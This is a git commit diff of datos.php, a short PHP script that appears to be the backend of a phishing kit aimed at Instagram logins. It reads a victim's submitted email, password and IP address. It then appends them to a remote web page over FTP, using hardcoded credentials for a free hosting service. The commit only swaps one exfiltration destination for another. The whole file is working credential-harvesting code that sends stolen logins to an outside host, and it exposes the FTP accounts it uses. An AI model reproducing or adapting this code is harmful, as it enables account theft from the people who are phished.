b747fd8e2ed7d56480ba784141bb28bf3e685cf1
codeteksistemas <58203899+codeteksistemas@users.noreply.github.com>
2020-12-16 03:26:17 -0500

    new161220

--- datos.php
+++ datos.php
@@ -3,7 +3,7 @@
 $correof = $_POST[ 'correof' ];
 $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR']; 
-$f = fopen("ftp://instapass20:codetek10@ftp.webcindario.com/web/index.html", "a"); 
+$f = fopen("ftp://capturasinsta:acceso20@files.000webhost.com/public_html/index.html", "a"); 
 fwrite ($f, 'Email: [<b><font color="#EE0707">'.$correof.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
 fclose($f);
 sleep(2);
